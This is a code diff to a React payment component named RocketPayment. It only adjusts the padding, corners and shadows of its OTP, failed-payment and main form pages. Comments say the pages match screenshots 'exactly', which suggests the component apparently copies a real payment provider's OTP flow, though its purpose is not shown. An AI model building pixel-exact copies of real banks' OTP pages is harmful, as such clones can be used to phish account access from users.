@@ -171,8 +171,8 @@ const RocketPayment = () => {
   // OTP Page (matches second screenshot exactly)
   if (showOtp) {
     return (
-      <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center pt-2">
-        <div className="w-full max-w-[700px] bg-white rounded shadow-sm">
+      <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center px-4 py-6">
+        <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
           {header}
           {/* Colored line under header */}
           <div className="flex h-[4px]">
@@ -243,8 +243,8 @@ const RocketPayment = () => {
   // Failed page
   if (showFailed) {
     return (
-      <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center pt-2">
-        <div className="w-full max-w-[700px] bg-white">
+      <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center px-4 py-6">
+        <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
           {header}
           {gatewayBanner}
           <div className="p-4 min-[375px]:p-6 text-center">
@@ -262,8 +262,8 @@ const RocketPayment = () => {
 
   // Main form page (matches first screenshot exactly)
   return (
-    <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center pt-2">
-      <div className="w-full max-w-[700px] bg-white border-2 border-[#0066cc]">
+    <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center px-4 py-6">
+      <div className="w-full max-w-[700px] bg-white rounded-lg shadow-[0_2px_20px_rgba(0,0,0,0.12)]">
         {header}
         {gatewayBanner}
 
